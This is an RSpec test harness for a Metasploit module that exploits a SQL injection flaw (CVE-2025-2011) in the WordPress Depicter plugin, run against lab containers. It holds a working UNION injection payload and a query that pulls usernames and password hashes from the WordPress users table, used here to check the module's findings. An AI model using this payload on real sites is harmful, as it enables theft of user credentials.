# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require_relative 'profiles'

RSpec.shared_context 'native Depicter target' do
  include_context 'module target'

  before(:all) do
    @dp_profile = DepicterProfiles.fetch
    @dp_native = { requests: [], commands: [], calls: [], reports: [], controls: [] }
    begin
      dp_counters('before')
      unless @dp_profile.fetch('mode') == 'unrelated'
        dp_verify_identity
        dp_seed_lead unless @dp_profile.fetch('mode') == 'absent'
        @dp_baseline = dp_identity
      end
      dp_native_controls('before')
      expect(dp_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets. Connection type: postgresql.')
      output = console_command('irb -e \'puts "DEPICTER_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/gather/wp_depicter_sqli_cve_2025_2011.rb").hexdigest}.to_json\'')
      @dp_native[:provenance] = JSON.parse(output.match(/^DEPICTER_PROVENANCE=(.+)$/)[1])
      expect(@dp_native[:provenance].fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@dp_native[:provenance].fetch('owner_sha256')).to eq(Digest::SHA256.file("modules/#{DepicterProfiles::OWNER}.rb").hexdigest)
      @dp_native[:preflight] = 'passed'
    ensure
      dp_save
    end
  end

  before do |example|
    @dp_workspace = 'depicter_' + example.metadata.fetch(:scoped_id).tr(':', '_')
    expect(console_command("workspace -a #{@dp_workspace}")).not_to include('[-]')
    expect(dp_reports).to eq([])
    console_command('back')
    expect(console_command("use #{DepicterProfiles::OWNER}")).not_to match(/Failed to load|Unknown command|No results/)
  end

  after(:all) do
    dp_native_controls('after') if @dp_native&.key?(:preflight)
    expect(console_command('irb -e \'puts "DEPICTER_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('DEPICTER_STATE={"sessions":[],"jobs":[]}') if @dp_native&.key?(:provenance)
  ensure
    dp_counters('after') if @dp_profile
    dp_save
  end

  def dp_prefix
    @dp_profile.fetch('prefix')
  end

  def dp_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-depicter.json'), JSON.pretty_generate(@dp_native)) if @dp_native
  end

  def dp_command(role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '25', *arguments]
    output, error, status = Open3.capture3(*argv)
    @dp_native.fetch(:commands) << { argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    dp_save
    raise "Native Depicter command failed: #{role}: #{error}" unless status.success?

    output
  end

  def dp_identity
    JSON.parse(dp_command('app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def dp_verify_identity
    identity = dp_identity
    expect(identity.values_at('core', 'php', 'uid', 'prefix', 'table_prefix')).to eq(['6.8.3', '8.3.28', 33, dp_prefix, @dp_profile.fetch('table_prefix')])
    expect(identity.fetch('db_error')).to eq('')
    expect(identity.fetch('group_concat_limit').to_i).to eq(@dp_profile.fetch('sql_limit')) if @dp_profile.key?('sql_limit')
    if @dp_profile.fetch('mode') == 'absent'
      expect(identity.values_at('active', 'active_plugins', 'plugin_version')).to eq([false, [], nil])
      expect(identity.fetch('table_counts')).to eq({})
    else
      release = DepicterProfiles::RELEASES.fetch(@dp_profile.fetch('release'))
      expect(identity.values_at('active', 'active_plugins', 'plugin_version')).to eq([true, ['depicter/depicter.php'], @dp_profile.fetch('release')])
      expect(identity.fetch('archive_sha256')).to eq(release.fetch('sha256'))
      expect(identity.fetch('installed_sha256')).to eq(release.fetch('installed_sha256'))
    end
    @dp_native[:identity] = identity
  end

  def dp_request(path, form: nil, headers: {})
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 20
    request = form ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    headers.each { |key, value| request[key] = value }
    request.set_form_data(form) if form
    response = http.request(request)
    @dp_native.fetch(:requests) << { method: request.method, path: path, headers_sent: headers, body_sent_base64: request.body && Base64.strict_encode64(request.body.b), code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    dp_save
    response
  ensure
    http&.finish if http&.started?
  end

  def dp_seed_lead
    document = JSON.parse(dp_command('app', 'php', '/opt/module-target/control.php', 'create-document', user: 'www-data'))
    token = JSON.parse(dp_command('app', 'php', '/opt/module-target/control.php', 'public-form-token', user: 'www-data'))
    expect(document.fetch('id')).to eq(token.fetch('source_id'))
    expect(token.fetch('user_id')).to eq(0)
    form = { 'action' => 'depicter-lead-submit', '_sourceId' => token.fetch('source_id'), '_contentId' => token.fetch('content_id'), '_contentName' => 'Module native form', '_csrfToken' => token.fetch('nonce'), 'email' => 'module-native@example.test', 'message' => 'depicter-native-café' }
    response = dp_request("#{dp_prefix}/wp-admin/admin-ajax.php", form: form)
    expect(response.code).to eq('200')
    expect(JSON.parse(response.body)).to eq('success' => true)
    @dp_native[:seed] = { document: document, content_id: token.fetch('content_id') }
  end

  def dp_ajax(search, page: 1, headers: {})
    query = URI.encode_www_form('action' => 'depicter-lead-index', 's' => search, 'perpage' => '10', 'page' => page, 'orderBy' => 'source_id', 'order' => 'ASC', 'dateStart' => '', 'dateEnd' => '', 'sources' => '')
    dp_request("#{dp_prefix}/wp-admin/admin-ajax.php?#{query}", headers: headers)
  end

  def dp_injection(expression)
    "9171') UNION SELECT 9172,9173,(#{expression}),9174,9175-- -"
  end

  def dp_admin_headers
    response = dp_request("#{dp_prefix}/wp-login.php", form: { 'log' => 'module_admin', 'pwd' => 'module-target-password', 'wp-submit' => 'Log In', 'redirect_to' => "#{dp_prefix}/wp-admin/", 'testcookie' => '1' }, headers: { 'Cookie' => 'wordpress_test_cookie=WP%20Cookie%20check' })
    expect(response.code).to eq('302')
    cookies = response.get_fields('set-cookie').filter_map do |cookie|
      cookie.split(';', 2).first if cookie.start_with?('wordpress_') && !cookie.start_with?('wordpress_test_cookie')
    end
    expect(cookies).not_to be_empty
    headers = { 'Cookie' => cookies.join('; ') }
    response = dp_request("#{dp_prefix}/wp-admin/admin.php?page=depicter-dashboard", headers: headers)
    expect(response.code).to eq('200')
    match = response.body.match(/"csrfToken"\s*:\s*"([^"]+)"/)
    expect(match).not_to be_nil
    headers.merge('X-DEPICTER-CSRF' => match[1])
  end

  def dp_native_controls(phase)
    mode = @dp_profile.fetch('mode')
    if mode == 'unrelated'
      expect(dp_request('/').body).to include('module-target-http-marker')
    else
      dp_verify_identity
      expect(dp_request("#{dp_prefix}/wp-login.php").code).to eq('200')
      if mode == 'absent'
        expect(dp_ajax('depicter-native').code).to eq('400')
      else
        headers = {}
        if mode == 'fixed'
          expect(dp_ajax('depicter-native').code).to eq('401')
          expect(dp_ajax(dp_injection('database()')).code).to eq('401')
          headers = dp_admin_headers
        end
        ordinary = dp_ajax('depicter-native', headers: headers)
        expect(ordinary.code).to eq('200')
        hits = JSON.parse(ordinary.body).fetch('hits')
        expect(hits.map { |hit| hit.fetch('content').fetch('id') }).to eq([@dp_native.fetch(:seed).fetch(:content_id)])
        expect(hits.first.fetch('fields').map { |field| field.fetch('value') }).to contain_exactly('module-native@example.test', 'depicter-native-café')
        expect(JSON.parse(dp_ajax('module-target-no-matching-lead', headers: headers).body).fetch('hits')).to eq([])
        marker = 'module_target_native_' + phase
        response = dp_ajax(dp_injection('0x' + marker.unpack1('H*')), headers: headers)
        expect(response.code).to eq('200')
        values = JSON.parse(response.body).fetch('hits').map { |hit| hit.fetch('content').fetch('id') }
        expect(values).to eq(mode == 'fixed' ? [] : [marker])
        if mode == 'affected'
          @dp_baseline.fetch('users').each do |user|
            expression = 'select hex(concat_ws(0x3b,user_login,user_pass)) from ' + @dp_profile.fetch('table_prefix') + 'users where ID=' + Integer(user.fetch('ID'), 10).to_s
            native = dp_ajax(dp_injection(expression))
            expect(native.code).to eq('200')
            extracted = JSON.parse(native.body).fetch('hits').map { |hit| hit.fetch('content').fetch('id') }
            expect(extracted.length).to eq(1)
            expect([extracted.first].pack('H*')).to eq(user.values_at('user_login', 'user_pass').join(';').b)
          end
        end
      end
      dp_unchanged
    end
    @dp_native.fetch(:controls) << { phase: phase, mode: mode, status: 'passed' }
    dp_save
  end

  def dp_unchanged
    stable = %w[core php uid prefix active active_plugins plugin_version archive_sha256 installed_sha256 table_prefix database schema users leads lead_fields]
    expect(dp_identity.slice(*stable)).to eq(@dp_baseline.slice(*stable))
  end

  def dp_sql(query)
    dp_command('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def dp_reports
    raise ArgumentError, 'Invalid Depicter workspace' unless @dp_workspace.match?(/\Adepicter_[0-9_]+\z/)

    rows = JSON.parse(dp_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.username),'[]'::json) FROM (
        SELECT p.username,s.data AS private_data,s.type,s.jtr_format,c.origin_type,o.module_full_name,
          service.name AS service,service.port,service.proto,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id LEFT JOIN metasploit_credential_privates s ON s.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services service ON service.id=o.service_id LEFT JOIN hosts h ON h.id=service.host_id
        WHERE w.name='#{@dp_workspace}'
      ) row
    SQL
    @dp_native.fetch(:reports) << { workspace: @dp_workspace, rows: rows }
    dp_save
    rows
  end

  def dp_owner(options = {}, action: 'run', service: 'app')
    endpoint = target_endpoint(service)
    values = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'SSL' => false, 'TARGETURI' => dp_prefix.empty? ? '/' : dp_prefix + '/', 'VERBOSE' => true, 'HttpClientTimeout' => 5 }.merge(options)
    @dp_native.fetch(:calls) << { workspace: @dp_workspace, action: action, service: service, options: values, state: 'started' }
    dp_save
    output = console_command("#{action} #{format_datastore_options(values)}", timeout: 90)
    @dp_native.fetch(:calls).last.merge!(state: 'returned', output_base64: Base64.strict_encode64(output.b))
    dp_save
    expect(output).not_to match(/Exception|undefined method|Unknown command|Msf::OptionValidateError|LocalJumpError|unexpected return/)
    expect(output).to include('Auxiliary module execution completed') if action == 'run'
    output
  end

  def dp_success(options = {}, count:)
    output = dp_owner(options)
    expect(output).not_to match(/Auxiliary (?:failed|aborted)/)
    expect(output).to include('Loot saved to:')
    users = @dp_baseline.fetch('users').to_h { |user| user.values_at('user_login', 'user_pass') }
    records = dp_reports
    expect(records.length).to eq(count.zero? ? users.length : count)
    records.each do |row|
      expect(row.fetch('private_data')).to eq(users.fetch(row.fetch('username')))
      expect(output).to include(row.fetch('username'), row.fetch('private_data'))
      endpoint = target_endpoint('app')
      expect(row.values_at('type', 'origin_type', 'module_full_name', 'proto', 'address', 'port')).to eq(['Metasploit::Credential::NonreplayableHash', 'Metasploit::Credential::Origin::Service', DepicterProfiles::OWNER, 'tcp', endpoint.fetch('host'), endpoint.fetch('port')])
    end
    loot = output.match(/Loot saved to: (.+)$/)
    expect(loot).not_to be_nil
    path = File.expand_path(loot[1].strip)
    expect(path).to start_with(File.expand_path(ENV.fetch('MSF_CFGROOT_CONFIG')) + '/')
    expected = records.map { |row| "Username: #{row.fetch('username')}, Password Hash: #{row.fetch('private_data')}" }
    expect(File.readlines(path, chomp: true)).to match_array(expected)
    @dp_native.fetch(:reports) << { workspace: @dp_workspace, loot: path, sha256: Digest::SHA256.file(path).hexdigest }
    dp_unchanged
    dp_save
    output
  end

  def dp_refusal(options = {}, action: 'run', service: 'app')
    before = dp_reports
    output = dp_owner(options, action: action, service: service)
    expect(output).not_to include('Loot saved to:')
    expect(dp_reports).to eq(before)
    dp_unchanged if @dp_baseline
    output
  end

  def dp_counters(phase)
    roles = @dp_profile.fetch('mode') == 'unrelated' ? %w[app reporting_db] : %w[app db reporting_db]
    values = roles.to_h do |role|
      counters = %w[memory.events pids.events].to_h do |name|
        numbers = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, numbers]
      end
      [role, counters]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "depicter-resources-#{phase}.json"), JSON.pretty_generate(values))
    values.each_value do |counters|
      expect(counters.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(counters.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
